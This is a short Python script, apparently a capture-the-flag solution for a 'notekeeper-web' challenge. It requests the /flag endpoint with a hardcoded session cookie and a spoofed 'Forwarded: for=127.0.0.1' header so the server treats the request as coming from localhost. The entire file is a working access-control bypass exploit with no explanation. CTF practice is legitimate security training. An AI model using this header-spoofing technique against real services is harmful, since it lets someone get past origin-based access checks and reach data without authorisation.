import requests

url = "https://notekeeper-web.challs.csc.tf/"
session = "AUyCwTDZhr5WiALeQfrzcJ9fpDN8MKCDfIw8DqPI2k0MCWAAFh-Wk6Ca0FyUtkKXZUK1jENH9J4cOGp7gBcKZPgejHHiPWnnu7u1GlJKu3fd_CpavklOOJ-Hm5U1VhX00ntD3bamgRX48qHFM-slH-pGRnl6TutmcPEOPe7XoglTteuYtrm5CVNvp72N8JI652IZG6NdbI_00bJr_c--buyDsnLhtl9FG9bxYA7VIGthnxNilHL8215ZyAg8g9G6uZgCiYhfPUcWNA8OZmxQxXdU7Ltnb8isB0m-7Up9ftO7HkUw0arY49oYMNxvU2Z8FA%3D%3D"
print(
	requests.get(
		url + "flag",
		cookies={"session": session},
		headers={"Forwarded": "for=127.0.0.1"},
	).text
)
